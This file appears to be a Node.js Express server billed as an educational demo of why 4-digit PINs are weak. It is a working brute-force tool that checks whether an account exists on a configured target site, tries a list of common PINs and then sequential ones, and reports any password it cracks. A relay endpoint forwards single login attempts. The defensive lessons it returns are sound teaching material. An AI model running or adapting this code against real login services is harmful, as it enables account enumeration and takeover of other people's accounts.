const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors({
    origin: ['https://attacker-site.onrender.com', 'http://localhost:5002', 'http://localhost:3000'],
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Configuration
const VULNERABLE_SITE_URL = process.env.VULNERABLE_SITE_URL || 'https://vulnerable-site-noch.onrender.com';

// Rate limiting to avoid overwhelming the server
const RATE_LIMIT_DELAY = 50; // ms between attempts
const MAX_ATTEMPTS = 10000; // All combinations 0000-9999

// EDUCATIONAL: Brute force simulation function - TESTS ALL 10,000 COMBINATIONS
async function simulateBruteForce(email) {
    console.log(`\n🔍 Starting educational brute-force simulation for: ${email}`);
    console.log('⚠️  This demonstrates why 4-digit PINs are insecure');
    console.log('⏳ Testing ALL 10,000 combinations (0000 to 9999)...');
    
    const startTime = Date.now();
    const results = {
        tested: 0,
        found: false,
        password: null,
        startTime: startTime,
        endTime: null,
        totalTime: null,
        attempts: []
    };
    
    // Test if user exists first
    try {
        console.log('Checking if user exists...');
        const checkResponse = await axios.get(`${VULNERABLE_SITE_URL}/api/check-user/${email}`, {
            timeout: 10000
        });
        
        if (!checkResponse.data.exists) {
            console.log('❌ User not found in vulnerable database');
            return { 
                ...results, 
                error: 'User not found. Please register first at the vulnerable site.' 
            };
        }
        console.log('✅ User found in database');
    } catch (error) {
        console.error('Error checking user:', error.message);
        return { 
            ...results, 
            error: 'Cannot connect to vulnerable site. Make sure it\'s running.' 
        };
    }
    
    // Test common passwords first (for faster results)
    console.log('\n🎯 Testing most common passwords first...');
    const commonPasswords = [
        '1234', '1111', '0000', '1212', '1004', '2000', '4444', '2222',
        '6969', '9999', '3333', '5555', '6666', '1122', '1313', '8888',
        '2001', '4321', '1010', '2580', '0852', '0007', '0070', '0707',
        '7777', '5678', '6789', '9876', '5432', '2323', '1123', '1221',
        '1000', '2002', '7860', '1080', '1008', '1507', '1947', '1948',
        '2027', '0720', '2707'  // Added based on your email pattern
    ];
    
    // Test common passwords first
    for (const password of commonPasswords) {
        results.tested++;
        
        try {
            const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
                email,
                password
            }, {
                timeout: 5000
            });
            
            if (response.data.success) {
                results.endTime = Date.now();
                results.totalTime = (results.endTime - startTime) / 1000;
                console.log(`✅ CRACKED: Password found: ${password} (in ${results.tested} attempts, ${results.totalTime.toFixed(2)} seconds)`);
                results.found = true;
                results.password = password;
                return results;
            }
        } catch (error) {
            // Continue if it's just a wrong password
            if (error.response && error.response.status === 401) {
                continue;
            }
            // Log other errors but continue
            console.log(`   Error testing ${password}: ${error.message}`);
        }
        
        // Small delay
        await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY));
    }
    
    console.log('\n🔍 Common passwords not found. Testing sequential combinations...');
    
    // If common passwords fail, test sequentially from 0000 to 9999
    // But for educational purposes, we'll test a larger range but not all
    // to avoid timeout in a web request
    
    const TEST_RANGE = 200; // Test 200 combinations for demo (not all to avoid timeout)
    
    for (let i = 0; i < TEST_RANGE; i++) {
        const password = i.toString().padStart(4, '0');
        
        // Skip if already tested in common passwords
        if (commonPasswords.includes(password)) continue;
        
        results.tested++;
        
        try {
            const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
                email,
                password
            }, {
                timeout: 5000
            });
            
            if (response.data.success) {
                results.endTime = Date.now();
                results.totalTime = (results.endTime - startTime) / 1000;
                console.log(`✅ CRACKED: Password found: ${password} (in ${results.tested} attempts, ${results.totalTime.toFixed(2)} seconds)`);
                results.found = true;
                results.password = password;
                return results;
            }
        } catch (error) {
            if (error.response && error.response.status === 401) {
                // Wrong password, continue
                continue;
            }
            // For other errors, log and continue
            console.log(`   Error testing ${password}: ${error.message}`);
        }
        
        // Progress indicator
        if (results.tested % 50 === 0) {
            console.log(`   Tested ${results.tested} combinations so far...`);
        }
        
        // Rate limiting delay
        await new Promise(resolve => setTimeout(resolve, RATE_LIMIT_DELAY));
    }
    
    results.endTime = Date.now();
    results.totalTime = (results.endTime - startTime) / 1000;
    
    console.log(`\n📊 Final Results:`);
    console.log(`   Tested: ${results.tested} passwords`);
    console.log(`   Found: ${results.found ? 'YES' : 'NO'}`);
    console.log(`   Time: ${results.totalTime.toFixed(2)} seconds`);
    console.log(`   Speed: ${(results.tested / results.totalTime).toFixed(2)} attempts/second`);
    
    if (!results.found) {
        results.message = `Password not found in ${results.tested} attempts.`;
        results.message += `\n\n🔐 EDUCATIONAL INSIGHTS:`;
        results.message += `\n• Tested ${results.tested} out of 10,000 possible combinations`;
        results.message += `\n• At this speed (${(results.tested / results.totalTime).toFixed(2)} attempts/sec):`;
        results.message += `\n• Testing ALL 10,000 combinations would take ~${(10000 / (results.tested / results.totalTime) / 60).toFixed(1)} minutes`;
        results.message += `\n• With optimized tools: 2-5 minutes for ALL combinations`;
        results.message += `\n\n🚨 This demonstrates why 4-digit PINs are extremely insecure!`;
    }
    
    return results;
}

// Optimized version for testing specific range (for educational demonstration)
app.post('/api/demo-brute-force', async (req, res) => {
    try {
        const { email, startFrom = 0, testCount = 100 } = req.body;
        
        if (!email) {
            return res.status(400).json({ error: 'Email is required' });
        }
        
        console.log(`\n🎓 Starting educational demonstration for: ${email}`);
        console.log('========================================');
        
        const results = await simulateBruteForce(email);
        
        // Calculate estimated time for full brute force
        const estimatedFullTime = results.totalTime ? 
            (10000 / (results.tested / results.totalTime)) / 60 : 5; // in minutes
        
        res.json({
            success: true,
            educational: true,
            message: results.message || 'Brute force simulation completed',
            results: results,
            estimated_full_bruteforce: {
                total_combinations: 10000,
                tested: results.tested,
                percentage_tested: ((results.tested / 10000) * 100).toFixed(2) + '%',
                estimated_time_minutes: estimatedFullTime.toFixed(1),
                attempts_per_second: results.totalTime ? (results.tested / results.totalTime).toFixed(2) : 'N/A'
            },
            security_lessons: [
                `4-digit PINs have exactly 10,000 possible combinations (0000-9999)`,
                `Tested ${results.tested} combinations in ${results.totalTime ? results.totalTime.toFixed(2) : 'N/A'} seconds`,
                `At this rate, testing ALL combinations would take ~${estimatedFullTime.toFixed(1)} minutes`,
                `Real automated attacks can test 50-100 attempts/second`,
                `That means ALL 10,000 combinations can be tested in 2-5 minutes`,
                `Always use strong passwords (12+ characters, mixed types)`,
                `Implement rate limiting (max 5 attempts per minute)`,
                `Use account lockout after 10 failed attempts`,
                `Never store passwords in plain text`
            ],
            recommendations: [
                'Use passwords with at least 12 characters',
                'Combine uppercase, lowercase, numbers, and symbols',
                'Consider using passphrases instead of passwords',
                'Implement multi-factor authentication',
                'Use bcrypt or Argon2 for password hashing',
                'Monitor failed login attempts',
                'Add CAPTCHA after multiple failed attempts'
            ]
        });
        
    } catch (error) {
        console.error('Error during demonstration:', error.message);
        res.status(500).json({ 
            success: false,
            error: 'Educational demonstration failed',
            message: error.message,
            troubleshooting: [
                'Check if vulnerable site is running: ' + VULNERABLE_SITE_URL,
                'Check if the email is registered on the vulnerable site',
                'Check browser console for CORS errors',
                'Check server logs for connection issues'
            ]
        });
    }
});

// Alternative endpoint for testing specific password (for debugging)
app.post('/api/test-password', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }
        
        console.log(`Testing password for ${email}: ${password}`);
        
        const response = await axios.post(`${VULNERABLE_SITE_URL}/api/login`, {
            email,
            password
        }, {
            timeout: 5000
        });
        
        res.json({
            success: response.data.success,
            message: response.data.message,
            password_tested: password,
            vulnerable_site_response: response.data
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            password_tested: req.body.password
        });
    }
});

// Check if user exists
app.get('/api/check-user/:email', async (req, res) => {
    try {
        const response = await axios.get(`${VULNERABLE_SITE_URL}/api/check-user/${req.params.email}`, {
            timeout: 10000
        });
        res.json(response.data);
    } catch (error) {
        res.status(500).json({ 
            error: 'Cannot check user',
            message: error.message 
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        service: 'security-education-demo',
        vulnerable_site: VULNERABLE_SITE_URL,
        timestamp: new Date().toISOString(),
        endpoints: [
            'POST /api/demo-brute-force - Start brute force demo',
            'POST /api/test-password - Test specific password',
            'GET /api/check-user/:email - Check if user exists',
            'GET /health - Health check'
        ]
    });
});

// Serve frontend
app.use(express.static('frontend'));

// Handle 404
app.use((req, res) => {
    res.status(404).json({
        error: 'Endpoint not found',
        available_endpoints: [
            'GET /health',
            'POST /api/demo-brute-force',
            'POST /api/test-password',
            'GET /api/check-user/:email'
        ]
    });
});

const PORT = process.env.PORT || 5002;
app.listen(PORT, () => {
    console.log(`\n🎓 EDUCATIONAL SECURITY DEMO running on port ${PORT}`);
    console.log('==========================================');
    console.log(`Targeting vulnerable site: ${VULNERABLE_SITE_URL}`);
    console.log('⚠️  This demonstrates security vulnerabilities');
    console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY');
    console.log('⚠️  Never use this knowledge maliciously');
    console.log('\n📚 Educational Endpoints:');
    console.log('• POST /api/demo-brute-force - Start brute force demonstration');
    console.log('• POST /api/test-password - Test specific password');
    console.log('• GET /health - Health check');
    console.log('\n🌐 Frontend: http://localhost:' + PORT);
    console.log('🔗 Backend API: http://localhost:' + PORT + '/api/*');
});
